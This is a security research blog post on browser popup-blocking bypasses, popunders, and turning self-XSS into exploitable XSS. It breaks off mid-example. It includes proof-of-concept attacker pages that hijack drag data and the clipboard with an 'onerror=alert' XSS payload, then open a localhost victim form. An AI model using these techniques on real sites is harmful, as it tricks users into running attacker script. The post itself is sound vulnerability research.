<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="IntroductionThis research was fun to do and I believe it addresses some cool and theoretically interesting techniques, some things have already been reported, and others, due to the format that these">
<meta property="og:type" content="article">
<meta property="og:title" content="Pop-Ups in a Good-World">
<meta property="og:url" content="http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/index.html">
<meta property="og:site_name" content="Keerok">
<meta property="og:description" content="IntroductionThis research was fun to do and I believe it addresses some cool and theoretically interesting techniques, some things have already been reported, and others, due to the format that these">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.imgur.com/WUWWSLv.gif">
<meta property="og:image" content="https://i.imgur.com/TrhjwkM.gif">
<meta property="og:image" content="https://i.imgur.com/4Aockql.gif">
<meta property="og:image" content="https://i.imgur.com/mhJjNE6.gif">
<meta property="og:image" content="https://i.imgur.com/i656ZpY.gif">
<meta property="og:image" content="https://i.imgur.com/RAq0zdY.gif">
<meta property="og:image" content="https://i.imgur.com/GhfQDnk.gif">
<meta property="og:image" content="https://i.imgur.com/aUk1aS9.gif">
<meta property="article:published_time" content="2021-06-08T01:37:15.000Z">
<meta property="article:modified_time" content="2022-09-01T01:41:09.452Z">
<meta property="article:author" content="Guilherme Keerok">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.imgur.com/WUWWSLv.gif">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Pop-Ups in a Good-World</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2021/09/22/mXSS-in-support-mozilla-org/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2021/05/09/XSS-via-postMessage-in-chat-mozilla-org-CVE-2021-21320/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&text=Pop-Ups in a Good-World"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&is_video=false&description=Pop-Ups in a Good-World"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Pop-Ups in a Good-World&body=Check out this article: http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&title=Pop-Ups in a Good-World"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&name=Pop-Ups in a Good-World&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/06/07/Pop-Ups-in-a-Good-World/&t=Pop-Ups in a Good-World"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Concepts"><span class="toc-number">2.</span> <span class="toc-text">Concepts</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Popup-blocking"><span class="toc-number">2.1.</span> <span class="toc-text">Popup blocking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Example-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popunder"><span class="toc-number">2.3.</span> <span class="toc-text">Popunder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Others"><span class="toc-number">2.4.</span> <span class="toc-text">Others</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Browsers-Behaviors"><span class="toc-number">3.</span> <span class="toc-text">Browsers Behaviors</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome-amp-Firefox-First-case"><span class="toc-number">3.1.</span> <span class="toc-text">Chrome &amp; Firefox - First case</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Chrome-amp-Firefox-second-case"><span class="toc-number">4.</span> <span class="toc-text">Chrome &amp; Firefox - second case</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Firefox-Only-Third-case"><span class="toc-number">5.</span> <span class="toc-text">Firefox Only - Third case</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome-amp-Firefox-Fourth-case"><span class="toc-number">5.1.</span> <span class="toc-text">Chrome &amp; Firefox - Fourth case</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Self-XSS-to-Good-XSS-in-imgur-com"><span class="toc-number">6.</span> <span class="toc-text">Self-XSS to Good-XSS in imgur.com</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#self-xss-in-Imgur"><span class="toc-number">6.1.</span> <span class="toc-text">self-xss in Imgur</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-XFO-Application-Context"><span class="toc-number">6.2.</span> <span class="toc-text">Bypass XFO (Application Context)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Frame-Counting"><span class="toc-number">6.3.</span> <span class="toc-text">Frame Counting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ondrag-here-too"><span class="toc-number">6.4.</span> <span class="toc-text">ondrag here too</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Clipboard-Trick"><span class="toc-number">6.5.</span> <span class="toc-text">Clipboard Trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PopUnders"><span class="toc-number">6.6.</span> <span class="toc-text">PopUnders</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-PopUp-Blocking"><span class="toc-number">6.7.</span> <span class="toc-text">Bypass PopUp Blocking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Little-Technique"><span class="toc-number">6.8.</span> <span class="toc-text">Little Technique</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SOME-Attack"><span class="toc-number">7.</span> <span class="toc-text">SOME Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SOME-with-popup-blocking-bypass"><span class="toc-number">7.1.</span> <span class="toc-text">SOME with popup blocking bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ugly-version"><span class="toc-number">7.1.1.</span> <span class="toc-text">Ugly version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pretty-version"><span class="toc-number">7.1.2.</span> <span class="toc-text">Pretty version</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSS-Timing-Attack"><span class="toc-number">8.</span> <span class="toc-text">CSS Timing Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-of-the-attack"><span class="toc-number">8.1.</span> <span class="toc-text">Basic of the attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSS-Timing-Attack-with-Popups"><span class="toc-number">8.2.</span> <span class="toc-text">CSS Timing Attack with Popups</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC-CSS-Timing-attack"><span class="toc-number">8.2.0.1.</span> <span class="toc-text">PoC CSS Timing attack</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion-amp-Further-Investigations"><span class="toc-number">8.3.</span> <span class="toc-text">Conclusion &amp; Further Investigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">8.4.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Pop-Ups in a Good-World
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Guilherme Keerok</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-06-08T01:37:15.000Z" itemprop="datePublished">2021-06-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This research was fun to do and I believe it addresses some cool and theoretically interesting techniques, some things have already been reported, and others, due to the format that these technologies were made, don’t need to be reported, as several techniques here are considered by design in browsers. One of the main themes that I tried to focus on this research was not to use <code>CSRF</code> so I tried to do something similar, maybe a “CSWF” (Cross-Site Window Forgery), this is just a joke, but yes, without <code>CSRF</code> but with a little bit of <code>Clickjacking</code>.</p>
<p>I began doing this research almost at the same time that some security features to prevent XSLeaks attacks started to be launched, so this article does not take into account these security features. The research is based only on popups in general and how we can use them to be able to exploit client-side vulnerabilities. Mandatorily, 90% of the search is based on attacks where we have a <code>popup blocking bypass</code>, <code>popunder</code>, <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Clickjacking">UI Redressing</a>, or a <a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">XSS</a>.</p>
<p>I believe that some things in this article have already been presented previously in some other blog post or maybe in some other article, however, in case I forgot to mention any of these references, <a target="_blank" rel="noopener" href="https://twitter.com/k33r0k">send me a DM on Twitter</a>.</p>
<p>Ps: Many of the things described in this article have already been introduced in the following link <a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a>, anyway, I will make a brief explanation on some subjects again.</p>
<hr>
<h1 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h1><h2 id="Popup-blocking"><a href="#Popup-blocking" class="headerlink" title="Popup blocking"></a>Popup blocking</h2><p>As mentioned, part of this research is based on unusual behavior in browsers, as well as the behavior of a <code>popup blocking</code> bypass. <code>Popup blocking</code> is a security feature of the browser that prevents a website from opening numerous windows or tabs without a user’s permission for this type of action. Opening  a single page is allowed by this feature, however, when a page tries to open two or more tabs at once, without direct user interaction, the popup blocking, in turn, needs to restrict this opening. Below is represented a common case, of which the popup blocking will not be triggered and will allow the opening of a new tab without restrictions, then we have the second case, where the <code>popup blocking</code> will be triggered and the browser will not allow the opening of a new tab.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://example.com&#x27;</span> &#x27;<span class="attr">_blank</span>&#x27;&gt;</span>open example.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">id</span>=<span class="string">click</span>&gt;</span>open example.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">click.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i&lt;<span class="number">5</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://example.com/&#x27;</span>,<span class="string">&#x27;_blank&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So, in a case where a popup blocking bypass is triggered, something similar to the demonstration below will happen:</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgur.com/WUWWSLv.gif"></h2><h2 id="Popunder"><a href="#Popunder" class="headerlink" title="Popunder"></a>Popunder</h2><p>A Popunder happens when we can open a new window and at the same time shift the focus from the window that was just opened to the source window. So if a page named <code>attack.html</code> contained in its HTML the following JavaScript  <code>&lt;script&gt;window.open(&#39;https://example.com/&#39;,&#39;_blank&#39;)&lt;/script&gt;</code>, when the browser opened the new tab containing the URL <a href="https://example.com/">https://example.com/</a> it would be necessary to make <code>example.com</code> do a browser focus on <code>attack.html</code> again or, by other technique, make the <code>attack.html</code> page focus itself. An example of this behavior is shown below.</p>
<p><img src="https://i.imgur.com/TrhjwkM.gif" alt="popunder"></p>
<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><p><code>XSS</code> and <code>ClickJacking</code> will also be covered in this article, however, we will discuss these in more restricted and very particular scenarios.</p>
<hr>
<h1 id="Browsers-Behaviors"><a href="#Browsers-Behaviors" class="headerlink" title="Browsers Behaviors"></a>Browsers Behaviors</h1><p>In the current version of Firefox, we have two different and interesting behaviors, but one of them, in particular, can be very usual to be able to enjoy a self-xss.</p>
<p>So, let’s say I have a self-xss inside victim.com, however, this <code>self-xss</code> needs to be added within a specific input, what kinds of methods can we use here? In general, we always analyze if the page contains <code>X-Frame-Options</code> and if it does, we leave the self-xss aside, as it gets really hard to prove impact.</p>
<p>In this case, I remembered testing something with the ondrag event and I ended up noticing something, when we set a metadata inside the ondrag’s content and put it inside another window, it keeps working, so why not join it with the opening a single window?</p>
<h2 id="Chrome-amp-Firefox-First-case"><a href="#Chrome-amp-Firefox-First-case" class="headerlink" title="Chrome &amp; Firefox - First case"></a>Chrome &amp; Firefox - First case</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 drag me</span><br><span class="line">2 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="number">3</span> <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;dragstart&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">4</span>         event.<span class="property">dataTransfer</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;&lt;img src=x onerror=alert(document.domain)&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">5</span>       &#125;)</span></span><br><span class="line"><span class="language-javascript"><span class="number">6</span> ondrag = <span class="function">() =&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">7</span>       <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">8</span>                <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:84/victim.html&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">9</span>        &#125;,<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">10</span> &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="number">11</span> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Some techniques <a target="_blank" rel="noopener" href="https://research.securitum.com/the-curious-case-of-copy-paste/">have already been published</a>, especially over <code>copy &amp; paste</code> cases, this ends up including the ondrag event. The <code>dataTransfer.setData</code> method is very similar to the <code>navigator.clipboard</code> except that, in the case of <code>navigator.clipboard</code>, there is no need for user interaction, while in the case of ondrag, an interaction is necessary, as the <code>dataTransfer.setData</code> method will only be triggered within a drag event. Then, in a summary about the method, it can be said that, when there is a drag on the page, the <code>dataTransfer.setData</code> will write a new data in place of the data that the user is dragging.<br>By joining the clipboard with the opening of a page, things can get interesting. The following scenario is an example of a case that I have come across in several places, Initially I structured it for a XSS that I reported to <a target="_blank" rel="noopener" href="https://imgur.com/">Imgur</a>, but after more research, I found a better alternative. The scenario consists of two pages, <code>attacker.html</code>, and <code>victim.html</code>. The <code>attacker.html</code> page contains the attack described earlier.</p>
<ul>
<li>line 1: <code>drag me</code> is just a random text, to convince the victim to start the <code>ondrag</code>;</li>
<li>line 3: an event is created and added to listen to the exact moment when the user starts the <code>ondrag</code>;</li>
<li>line 4: <code>event.dataTransfer.setData</code> will change the <code>drag me</code> content to<code>&lt;img src = x onerror = alert (1)&gt;</code>;</li>
<li>line 6: <code>ondrag</code> is referenced to execute a function whenever the event is executed by the user;</li>
<li>line 8: a window is opened with the url where there is a <code>self-xss</code>;</li>
</ul>
<p>This case was previously presented by <a target="_blank" rel="noopener" href="https://twitter.com/RenwaX23">@renwax23</a>, however, it uses scrolling for the payload saved in the dataTransfer’s <code>setData</code> to be inserted in the vulnerable field at the end of the page. <a target="_blank" rel="noopener" href="https://renwax23.github.io/X/xschal1j.html">https://renwax23.github.io/X/xschal1j.html</a>.</p>
<p><img src="https://i.imgur.com/4Aockql.gif"></p>
<hr>
<h1 id="Chrome-amp-Firefox-second-case"><a href="#Chrome-amp-Firefox-second-case" class="headerlink" title="Chrome &amp; Firefox - second case"></a>Chrome &amp; Firefox - second case</h1><p>The second case is similar to the first, but uses <code>navigator.clipboard</code> instead. However, for this attack to work more naturally, the vulnerable input where the <code>XSS</code> payload should be placed needs to have an id, so it is possible to open a new window and after the content loads, the input will be focus automatically, this is not new, but is something that makes the attack more interesting.</p>
<p><code>form.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#xss</span>&#123; </span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">700px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">xss</span> <span class="attr">type</span>=<span class="string">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">output</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        output.<span class="property">innerHTML</span>=xss.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;,<span class="number">1500</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><code>evil.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1 <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">2    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">3    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">4    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">5        press ctrl+v</span><br><span class="line">6        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="number">7</span>            onkeypress=<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">8</span>                <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">9</span>                    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost/form.html#xss&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">10</span>                &#125;,<span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="number">11</span>            &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="number">12</span>            <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">13</span>                navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(<span class="string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">14</span>            &#125;,<span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="number">15</span>        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">16    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">17 <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/mhJjNE6.gif"></p>
<hr>
<h1 id="Firefox-Only-Third-case"><a href="#Firefox-Only-Third-case" class="headerlink" title="Firefox Only - Third case"></a>Firefox Only - Third case</h1><p>Another interesting behavior of Firefox is the interaction between top window and <code>iframe</code>. In other browsers, it is necessary for at least one click to the focus to be placed on an iframe and you be able to interact with it. However, in Firefox, this click is not necessary and the lack of this interaction allows an ondrag event to end on an input within an <code>iframe</code>.</p>
<p><code>form.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>result search:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">output</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span 